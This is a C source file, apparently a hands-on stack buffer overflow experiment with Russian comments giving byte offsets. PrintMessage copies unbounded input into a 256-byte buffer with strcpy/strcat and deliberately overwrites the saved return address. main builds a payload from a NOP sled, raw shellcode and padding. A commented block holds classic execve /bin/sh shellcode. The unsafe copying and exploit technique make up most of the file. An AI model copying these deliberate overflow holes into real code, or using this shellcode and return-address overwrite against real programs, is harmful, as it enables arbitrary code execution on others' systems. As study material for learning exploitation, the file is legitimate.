#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include<stdbool.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include "common.h"

int message_count;

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void PrintMessage(struct Message message)
{
    char buf[256]; //256 байт
    strcpy(buf, "["); //0 байт
    strcat(buf, message.sender); //14 байт
    strcat(buf, "]: "); //4 байта -> 8 байт
    strcat(buf, message.text);
    printf("Recieved message[%d]: %s\n", message_count, buf);
    //288 байт

    long c = 8;
    //int addr = &(buf[0])+10;
    //(*(buf+256+16))+=c;

    //int t = 134514080;//n++ addr
    //int t = /*134514219+16;*/134514250;
    //(*(buf+256/*buf*/+16/*Frame pointer*/))=t+8;
    //printf("Recieved message[%d]: %s\n", message_count, buf+35);
    //printf("buf = %p\n", buf);
    (*((long *)(buf+256+16)))+=c;//=(long)(buf);
    //(*((long *)(buf+256+12)))=/*+=c;*/(long)(buf);///=(int)buf+39;//34//32//30
    printf("1111111\n");
    //288 байт
}

int main(int argc, char *argv[])
{
    struct Message message;
    int i;
    int n = 0;
    char shellcode[] ="\x55\x89\xec\x53\x31\xdb\x89\xc3\x40\xcd\x00\xe8\xcc\x7f\xfb\xf7";



            //"\x55\x89\xff\x31\xff\xe8\xa2\x4e\x76\xf8";

    //"\x31\xff\xe8\xa5\x4e\x76\xf8";

        /*"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";*/

    //printf("%d\n", sizeof(shellcode));

//    for(i = 0; i < 31; i++)
//        message.sender[i] = 'o';
//    printf("i = %d\n", i);
//    message.sender[i] = '\0';
//    for(i = 0; i < 256-31-4-1; i++)
//        message.text[i] = 'a';
//    message.sender[i] = '\0';
    for(i = 0; i < 31; i++)
        message.sender[i] = /*0x90*/'o';
    printf("int = %d, char = %d, long = %d\n", sizeof(int), sizeof(char), sizeof(long));
    message.sender[i++] = '\0';
//    for(i = 0; i < 256-31-4-1 + 8+4; i++)
//        message.text[i] = 'a';
    for(i; i < 120; i++)
        message.text[i] = 0x90;
    for(i; i < 120+strlen(shellcode); i++)
        message.text[i] = shellcode[i-120];
    for(i; i < 256/*+4+4*/; i++)
        message.text[i] = /*0x90*/'a';
    message.text[i] = '\0';
    PrintMessage(message);
    n++;
    printf("n = %d\n", n);
    return 0;
}
